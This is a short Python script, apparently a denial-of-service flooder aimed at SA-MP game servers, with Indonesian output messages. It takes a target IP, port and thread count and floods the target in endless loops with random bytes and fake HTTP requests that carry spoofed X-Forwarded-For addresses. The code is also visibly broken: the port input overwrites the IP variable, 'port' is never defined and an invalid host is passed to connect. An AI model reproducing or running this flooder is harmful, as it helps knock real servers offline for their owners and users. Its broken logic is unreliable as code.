import threading
import time
import os, sys
import socket
import random, requests
 
print("Ddos Samp | 2023 | time:274.180day |")
ip = str(input("Ip>>"))
ip = int(input("Port/t>>"))
th = int(input("Thread/t>>"))

def spoofer1():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled
   
def spoofer2():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled  

def spoofer3():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled

byte1 = random._urandom(1024)
byte2 = random._urandom(4024)
def start2():
  global byte1, byte2
  connection = "Connection: Keep-Alive\r\n"
  connection += "Cache-Control: max-age=0\r\n"
  connection2 = "Connection: Keep-Alive\r\n"
  connection2 += "Cache-Control: max-age=0\r\n"
  connection3 = "Connection: Keep-Alive\r\n"
  connection3 += "Cache-Control: max-age=0\r\n"
  connection += "pragma: no-cache\r\n"
  connection += "X-Forwarded-For: " + spoofer1() + "\r\n"
  connection2 += "X-Forwarded-For: " + spoofer2() + "\r\n"
  connection3 += "X-Forwarded-For: " + spoofer3() + "\r\n"
  connect = "Connection : keep-Alive\r\n\r\n"
  get_rand = random.choice(['GET','POST',"HEAD"])
  get_host = "GET /Attacked-RR/1.1\r\nHost: " + ip + "\r\n"
  request = get_host + connect + connection + get_rand + "\r\n"
  while True:
        try:
          s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
          s.connect((ip,port))
          s.send(byte1)
          s.send(byte1)
          s.send(byte1)
          s.sendall(str.encode(request))
          s.sendall(str.encode(request))
          for i in range(th):
              s.connect((str(int),int(port)))
              s.send(byte1)
              s.send(byte1)
              s.send(byte1)
              s.sendall(str.encode(request))
              s.sendall(str.encode(request))
              print("Succes Mengirimkan THREAD Sebesar Cintamu Kepadaku😝🚬 ")
        except:
             s.close()
             print("Server Succes Down")
for i in range(th):
  th = threading.Thread(target=start2)
  th.start()
